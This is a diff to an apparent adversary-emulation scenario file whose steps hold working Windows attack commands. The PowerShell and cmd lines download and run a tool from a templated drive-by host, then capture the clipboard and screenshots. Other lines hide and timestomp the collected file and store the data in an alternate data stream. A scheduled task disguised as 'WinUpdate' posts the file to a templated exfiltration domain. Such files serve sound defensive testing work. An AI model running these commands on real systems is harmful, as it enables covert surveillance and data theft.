@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "about.js",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -91,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -102,7 +111,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -113,10 +123,10 @@
                 "phishing": "self.phish_1",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -126,10 +136,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{invoke-webrequest http://${self.driveby_domain2}/${self.tool_name2}-O${self.temp_dir_name}\\${self.tool_name2}; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{invoke-webrequest http://${self.driveby_domain2}/${self.tool_name2}-O${self.temp_dir_name}\\${self.tool_name2}; echo \" \"}"
             }
         },
         {
@@ -139,10 +149,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c wscript${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c wscript${self.temp_dir_name}\\${self.tool_name2}&& echo \" \""
             }
         },
         {
@@ -152,10 +162,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell Get-Clipboard >>${self.temp_dir_name}\\license.rtf; echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell Get-Clipboard >>${self.temp_dir_name}\\license.rtf; echo \" \""
             }
         },
         {
@@ -165,10 +175,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c attrib +H${self.temp_dir_name}\\license.rtf && echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c attrib +H${self.temp_dir_name}\\license.rtf && echo \" \""
             }
         },
         {
@@ -178,10 +188,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell $a = quser; $b = Out-String -inputobject $a; $c = $b.split(\"`n>\")[2].split()[0]; $d = \"${self.temp_dir_name}/~temp482\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell $a = quser; $b = Out-String -inputobject $a; $c = $b.split(\"`n>\")[2].split()[0]; $d = \"${self.temp_dir_name}/~temp482\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
             }
         },
         {
@@ -191,10 +201,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell $data = [convert]::ToBase64String((Get-Content${self.temp_dir_name}\\~temp482 -Encoding byte)); Set-Content${self.temp_dir_name}\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell $data = [convert]::ToBase64String((Get-Content${self.temp_dir_name}\\~temp482 -Encoding byte)); Set-Content${self.temp_dir_name}\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
             }
         },
         {
@@ -204,10 +214,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden${self.temp_dir_name}\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden${self.temp_dir_name}\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
             }
         },
         {
@@ -217,10 +227,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://${self.exfil_domain}-Method Post -InFile${self.temp_dir_name}\\license.rtf\" /ST $hourMinute /F; echo \" \""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://${self.exfil_domain}-Method Post -InFile${self.temp_dir_name}\\license.rtf\" /ST $hourMinute /F; echo \" \""
             }
         },
         {
@@ -231,7 +241,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -241,7 +252,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
